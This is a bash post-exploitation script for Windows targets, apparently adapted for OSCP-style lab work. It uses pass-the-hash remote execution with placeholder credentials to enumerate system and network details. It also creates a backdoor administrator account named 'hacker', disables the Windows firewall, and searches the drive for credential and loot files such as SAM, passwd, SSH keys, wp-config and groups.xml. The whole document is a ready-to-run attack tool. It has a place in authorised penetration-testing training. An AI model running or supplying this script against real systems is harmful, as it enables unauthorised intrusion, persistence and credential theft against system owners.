#!/bin/bash
# post exploitation script for Windows
# from https://gist.github.com/1N3/c784d60f6e5956e019c7
# mod by OS-18010
# @tildasec
# https://github.com/crsftw/OSCP-cheat-sheet
# do you OSCP much ?

TARGET=$1 # target IP
DOMAIN=KEVIN	# modify this
USERNAME=kevin	# modify this
PASSWORD=xyz # modify this
FILENAME=$PWD/post-exploitation-windows.txt

# create file and give permissions
> $PWD/post-exploitation-windows.txt
touch $PWD/post-exploitation-windows.txt
chmod 777 $PWD/post-exploitation-windows.txt

# do stuff
echo -e " \e[96m=========== SYSINFO & NETWORK ===========\e[0m"
printf \\n\\n
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "whoami"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "systeminfo \| findstr /B /C:"Domain""  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "systeminfo" | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "whoami /all"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "ipconfig /all"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "arp -a"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "route print"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c netstat -at | findstr LISTENING" | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c netstat -at | findstr ESTABLISHED" | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "tasklist /V"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c type C:\Windows\system32\drivers\etc\hosts"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c type C:\Winnt\system32\drivers\etc\hosts"   | tee -a $PWD/post-exploitation-windows.txt

echo -e " \e[96m=========== PROOF file & NETWORK-SECRET ===========\e[0m"
printf \\n\\n
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C: \| findstr proof.txt"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C: \| findstr network-secret.txt"   | tee -a $PWD/post-exploitation-windows.txt

echo -e " \e[96m=========== FILE SHARING & accounts ===========\e[0m"
printf \\n\\n
#pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "echo %USERDOMAIN%\%USERNAME%"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net accounts"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net user /DOMAIN"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net localgroup"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net share"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net view"   | tee -a  $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "wmic qfe list"   | tee -a  $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net user hacker 1234567 /add"   | tee -a  $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net localgroup Administrators /add hacker"   | tee -a  $PWD/post-exploitation-windows.txt
#pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c reg query 'HKLM\Software\Microsoft\WindowsNT\Currentversion\Winlogon'"   | tee -a  $PWD/post-exploitation-windows.txt
#pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c reg query 'HKLM\System\CurrentControlSet\Services\SNMP'"  | tee -a  $PWD/post-exploitation-windows.txt

echo -e " \e[96m=========== FIREWALL, TS ACCES, backdoor ===========\e[0m"
printf \\n\\n
#pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD--system //$TARGET "cmd /c reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server /v fAllowToGetHelp /t REG_DWORD /d 1 /f"   | tee -a  $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "netsh advfirewall show allprofiles state"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "netsh advfirewall firewall show rule name=all"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "netsh advfirewall set allprofiles state off"  | tee -a $PWD/post-exploitation-windows.txt


sleep 3
echo -e " \e[96m=========== SERVICES and PERMISSIONS ===========\e[0m"
printf \\n\\n
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "Icacls * \| findstr Everyone"  | tee -a $PWD/post-exploitation-windows.txt

echo -e " \e[96m=========== LOOT \\$\\$\\$ ===========\e[0m"
printf \\n\\n
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C: \| findstr groups.xml"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C: \| findstr scheduledtasks.xml"   | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.bat"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.ps"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.ps1"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.py"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.pl"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.rb"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.doc"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.docx"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.odt"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.zip"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.rar"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.7z"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.tar"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.tar"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.tar.gz"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.gz"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.pdf"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.cap"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.pcap"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.sql"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.pdb"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.sam"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.backup*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*_backup*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*secret*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.htpasswd*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.passwd*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*\/etc\/passwd*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*vnc*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.ssh*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*authorized_keys*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*known_hosts*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.subversion*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.git*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.sudoers*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*wp-config*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*config.inc*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*settings.*"  | tee -a $PWD/post-exploitation-windows.txt
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "cmd /c dir /s /b C:\*.lnk"  | tee -a $PWD/post-exploitation-windows.txt


printf \\n\\n
echo -e " \e[96m ========== DONE ==========\e[0m"
printf \\n\\n
